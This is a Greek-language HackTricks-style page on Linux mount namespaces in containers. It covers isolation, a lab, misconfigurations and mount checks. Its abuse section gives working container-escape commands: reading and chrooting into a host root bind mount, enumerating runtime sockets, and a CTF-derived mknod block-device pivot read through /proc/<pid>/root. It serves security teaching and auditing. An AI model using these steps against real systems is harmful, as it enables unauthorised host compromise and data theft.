# Namespace προσαρτήσεων

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το namespace προσαρτήσεων ελέγχει τον **πίνακα προσαρτήσεων** που βλέπει μια διεργασία. Αυτό είναι ένα από τα σημαντικότερα χαρακτηριστικά απομόνωσης των containers, επειδή το root filesystem, τα bind mounts, τα tmpfs mounts, η προβολή του procfs, η έκθεση του sysfs και πολλά βοηθητικά mounts ειδικά για το runtime εκφράζονται όλα μέσω αυτού του πίνακα προσαρτήσεων. Δύο διεργασίες μπορεί να έχουν πρόσβαση στα `/`, `/proc`, `/sys` ή `/tmp`, αλλά το σε τι αντιστοιχούν αυτές οι διαδρομές εξαρτάται από το mount namespace στο οποίο βρίσκονται.

Από την άποψη του container security, το mount namespace συχνά είναι η διαφορά μεταξύ του «αυτό είναι ένα σωστά προετοιμασμένο application filesystem» και του «αυτή η διεργασία μπορεί να δει ή να επηρεάσει άμεσα το filesystem του host». Γι' αυτό τα bind mounts, τα volumes `hostPath`, οι privileged λειτουργίες mount και οι εγγράψιμες εκθέσεις των `/proc` ή `/sys` περιστρέφονται γύρω από αυτό το namespace.

## Λειτουργία

Όταν ένα runtime εκκινεί ένα container, συνήθως δημιουργεί ένα νέο mount namespace, προετοιμάζει ένα root filesystem για το container, προσαρτά το procfs και άλλα βοηθητικά filesystems όπως απαιτείται και, στη συνέχεια, προσθέτει προαιρετικά bind mounts, tmpfs mounts, secrets, config maps ή host paths. Μόλις η διεργασία εκτελείται μέσα στο namespace, το σύνολο των mounts που βλέπει είναι σε μεγάλο βαθμό ανεξάρτητο από την προεπιλεγμένη προβολή του host. Ο host μπορεί να εξακολουθεί να βλέπει το πραγματικό υποκείμενο filesystem, αλλά το container βλέπει την έκδοση που έχει συναρμολογήσει γι' αυτό το runtime.

Αυτό είναι ισχυρό επειδή επιτρέπει στο container να πιστεύει ότι διαθέτει το δικό του root filesystem, παρόλο που ο host εξακολουθεί να διαχειρίζεται τα πάντα. Είναι επίσης επικίνδυνο, επειδή αν το runtime εκθέσει το λάθος mount, η διεργασία αποκτά ξαφνικά ορατότητα σε πόρους του host, τους οποίους το υπόλοιπο security model μπορεί να μην είχε σχεδιαστεί να προστατεύει.

## Lab

Μπορείτε να δημιουργήσετε ένα private mount namespace με:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Αν ανοίξετε ένα άλλο shell εκτός αυτού του namespace και επιθεωρήσετε τον πίνακα προσαρτήσεων, θα δείτε ότι το mount του tmpfs υπάρχει μόνο μέσα στο απομονωμένο mount namespace. Αυτή είναι μια χρήσιμη άσκηση, επειδή δείχνει ότι η απομόνωση των mount δεν είναι αφηρημένη θεωρία· ο kernel παρουσιάζει κυριολεκτικά έναν διαφορετικό πίνακα προσαρτήσεων στη διεργασία.

Αν ανοίξετε ένα άλλο shell εκτός αυτού του namespace και επιθεωρήσετε τον πίνακα προσαρτήσεων, το mount του tmpfs θα υπάρχει μόνο μέσα στο απομονωμένο mount namespace.

Μέσα σε containers, μια γρήγορη σύγκριση είναι:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Το δεύτερο παράδειγμα δείχνει πόσο εύκολο είναι μια ρύθμιση του runtime να δημιουργήσει ένα τεράστιο κενό στο όριο του filesystem.

## Χρήση σε Runtime

Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O βασίζονται όλα σε ένα ιδιωτικό mount namespace για τα κανονικά containers. Το Kubernetes χρησιμοποιεί τον ίδιο μηχανισμό για volumes, projected secrets, config maps και `hostPath` mounts. Τα περιβάλλοντα Incus/LXC βασίζονται επίσης σε μεγάλο βαθμό στα mount namespaces, ειδικά επειδή τα system containers συχνά εκθέτουν πιο πλούσια και περισσότερο παρόμοια με machine filesystems σε σχέση με τα application containers.

Αυτό σημαίνει ότι όταν εξετάζετε ένα πρόβλημα filesystem σε container, συνήθως δεν εξετάζετε κάποια μεμονωμένη ιδιομορφία του Docker. Εξετάζετε ένα πρόβλημα mount namespace και ρύθμισης του runtime, το οποίο εκδηλώνεται μέσω όποιας πλατφόρμας εκκίνησε το workload.

## Λανθασμένες ρυθμίσεις

Το πιο προφανές και επικίνδυνο λάθος είναι η έκθεση του root filesystem του host ή κάποιου άλλου ευαίσθητου path του host μέσω bind mount, για παράδειγμα `-v /:/host` ή ενός writable `hostPath` στο Kubernetes. Σε αυτό το σημείο, το ερώτημα δεν είναι πλέον «μπορεί το container με κάποιον τρόπο να κάνει escape;», αλλά «πόσο χρήσιμο περιεχόμενο του host είναι ήδη άμεσα ορατό και writable;» Ένα writable host bind mount συχνά μετατρέπει το υπόλοιπο exploit σε απλή υπόθεση τοποθέτησης αρχείων, chrooting, τροποποίησης ρυθμίσεων ή εντοπισμού runtime socket.

Ένα ακόμη συνηθισμένο πρόβλημα είναι η έκθεση του host `/proc` ή `/sys` με τρόπους που παρακάμπτουν την ασφαλέστερη οπτική του container. Αυτά τα filesystems δεν είναι συνηθισμένα data mounts· αποτελούν interfaces προς την κατάσταση του kernel και των processes. Αν το workload έχει άμεση πρόσβαση στις εκδόσεις του host, πολλές από τις παραδοχές πίσω από το container hardening παύουν να εφαρμόζονται ομαλά.

Οι read-only προστασίες έχουν επίσης σημασία. Ένα read-only root filesystem δεν ασφαλίζει μαγικά ένα container, αλλά αφαιρεί μεγάλο μέρος του χώρου staging του attacker και κάνει δυσκολότερα το persistence, την τοποθέτηση helper binaries και την παραποίηση ρυθμίσεων. Αντίθετα, ένα writable root ή ένα writable host bind mount παρέχει στον attacker χώρο για να προετοιμάσει το επόμενο βήμα.

## Κατάχρηση

Όταν γίνεται κακή χρήση του mount namespace, οι attackers συνήθως κάνουν ένα από τέσσερα πράγματα. **Διαβάζουν δεδομένα του host** που θα έπρεπε να παραμείνουν εκτός του container. **Τροποποιούν ρυθμίσεις του host** μέσω writable bind mounts. **Κάνουν mount ή remount πρόσθετων resources** αν το επιτρέπουν τα capabilities και το seccomp. Ή **αποκτούν πρόσβαση σε ισχυρά sockets και runtime state directories**, τα οποία τους επιτρέπουν να ζητήσουν από την ίδια την container platform περισσότερη πρόσβαση.

Αν το container μπορεί ήδη να δει το filesystem του host, το υπόλοιπο security model αλλάζει αμέσως.

Όταν υποψιάζεστε host bind mount, επιβεβαιώστε πρώτα τι είναι διαθέσιμο και αν είναι writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Αν το root filesystem του host είναι mounted read-write, η άμεση πρόσβαση στο host συχνά είναι τόσο απλή όσο:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Αν ο στόχος είναι προνομιακή πρόσβαση στο runtime αντί για άμεσο chrooting, απαριθμήστε τα sockets και την κατάσταση του runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Εάν υπάρχει το `CAP_SYS_ADMIN`, ελέγξτε επίσης εάν μπορούν να δημιουργηθούν νέα mounts μέσα από το container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Πλήρες Παράδειγμα: Two-Shell `mknod` Pivot

Μια πιο εξειδικευμένη διαδρομή abuse εμφανίζεται όταν ο root user του container μπορεί να δημιουργεί block devices, το host και το container μοιράζονται μια user identity με χρήσιμο τρόπο και ο attacker έχει ήδη ένα low-privilege foothold στο host. Σε αυτή την περίπτωση, το container μπορεί να δημιουργήσει έναν device node όπως το `/dev/sda`, και ο low-privilege host user μπορεί αργότερα να το διαβάσει μέσω του `/proc/<pid>/root/` για το αντίστοιχο container process.<sup>[[1]](#references)</sup>

Μέσα στο container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Από το host, ως ο αντίστοιχος χρήστης χαμηλών προνομίων, αφού εντοπίσετε το PID του shell του container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Το σημαντικό μάθημα δεν είναι η ακριβής αναζήτηση για το string του CTF. Είναι ότι η έκθεση του mount namespace μέσω του `/proc/<pid>/root/` μπορεί να επιτρέψει σε έναν χρήστη του host να επαναχρησιμοποιήσει device nodes που δημιουργήθηκαν από το container, ακόμη και όταν η πολιτική συσκευών του cgroup απέτρεπε την άμεση χρήση τους μέσα στο ίδιο το container.<sup>[[1]](#references)</sup>

## Έλεγχοι

Αυτές οι εντολές δείχνουν την προβολή του filesystem στην οποία εκτελείται πραγματικά η τρέχουσα διεργασία. Ο στόχος είναι να εντοπιστούν mounts που προέρχονται από το host, ευαίσθητα paths με δυνατότητα εγγραφής και οτιδήποτε φαίνεται ευρύτερο από ένα κανονικό root filesystem ενός application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Τι είναι ενδιαφέρον εδώ:

- Τα Bind mounts από το host, ειδικά τα `/`, `/proc`, `/sys`, οι κατάλογοι runtime state ή οι τοποθεσίες socket, θα πρέπει να ξεχωρίζουν αμέσως.
- Τα μη αναμενόμενα read-write mounts είναι συνήθως πιο σημαντικά από μεγάλο αριθμό read-only helper mounts.
- Το `mountinfo` είναι συχνά το καλύτερο σημείο για να δείτε αν ένα path προέρχεται πραγματικά από το host ή υποστηρίζεται από overlay.

Αυτοί οι έλεγχοι καθορίζουν **ποιοι πόροι είναι ορατοί σε αυτό το namespace**, **ποιοι προέρχονται από το host** και **ποιοι από αυτούς είναι writable ή security-sensitive**.

## Αναφορές

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
